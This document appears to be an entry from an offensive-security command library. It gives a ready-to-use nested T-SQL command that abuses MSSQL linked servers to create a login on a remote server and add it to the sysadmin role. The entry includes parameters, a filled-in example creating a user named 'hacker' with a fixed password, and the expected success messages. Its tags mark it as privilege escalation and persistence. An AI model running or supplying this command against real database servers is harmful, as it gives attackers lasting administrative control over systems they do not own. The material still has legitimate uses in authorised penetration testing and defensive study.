---
id: eb2f529e-4ecc-46a2-82bd-03083d59f4d6
name: create-sysadmin-user-via-linked-server
type: command
executor: sql
data: >-
  EXECUTE('EXECUTE(''CREATE LOGIN $_USERNAME WITH PASSWORD = ''''$_PASSWORD''''
  '') AT "$_DOMAIN\\$_TARGET_SERVER1"') AT "$_DOMAIN\\$_TARGET_SERVER2"

  EXECUTE('EXECUTE(''sp_addsrvrolemember ''''$_USERNAME'''' , ''''sysadmin''''
  '') AT "$_DOMAIN\\$_TARGET_SERVER1"') AT "$_DOMAIN\\$_TARGET_SERVER2"
output: null
created_at: '2023-04-06T03:56:34.105426+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - mssql
  - privilege-escalation
  - persistence
verified: true
validated: true
---

# create-sysadmin-user-via-linked-server

## Command

```sql
EXECUTE('EXECUTE(''CREATE LOGIN $_USERNAME WITH PASSWORD = ''''$_PASSWORD'''' '') AT "$_DOMAIN\\$_TARGET_SERVER1"') AT "$_DOMAIN\\$_TARGET_SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''$_USERNAME'''' , ''''sysadmin'''' '') AT "$_DOMAIN\\$_TARGET_SERVER1"') AT "$_DOMAIN\\$_TARGET_SERVER2"
```

## Description

Creates a new SQL login on a remote server via a linked server and grants it sysadmin privileges, enabling persistent administrative access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Desired username (e.g., hacker) | Yes |
| $_PASSWORD | Password for the new login | Yes |
| $_DOMAIN | Domain name (e.g., DOMINIO) | Yes |
| $_TARGET_SERVER1 | Primary target server | Yes |
| $_TARGET_SERVER2 | Linked server executing the command | Yes |

## Examples

### Create Hacker User

```sql
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## Expected Output

Messages like: The server principal 'hacker' has been created successfully. The server principal 'hacker' is already a member of the 'sysadmin' role.

## Related

- [[procedures/Exploit-MSSQL-Trusted-Linked-Servers]]
- [[commands/enable-and-execute-xp-cmdshell-via-linked-server]]
